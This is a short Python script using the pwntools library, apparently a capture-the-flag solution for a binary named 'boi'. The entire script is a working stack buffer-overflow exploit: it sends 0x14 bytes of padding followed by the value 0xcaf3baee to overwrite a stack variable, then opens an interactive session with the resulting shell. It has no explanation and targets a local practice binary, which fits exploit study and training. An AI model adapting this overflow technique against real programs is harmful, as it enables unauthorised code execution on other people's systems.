#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF('./boi')

p = process('./boi')

payload = 0xcaf3baee

padding = b'A'*0x14

exploit = padding + p64(payload)

p.recvline()
p.send(exploit)

p.interactive()
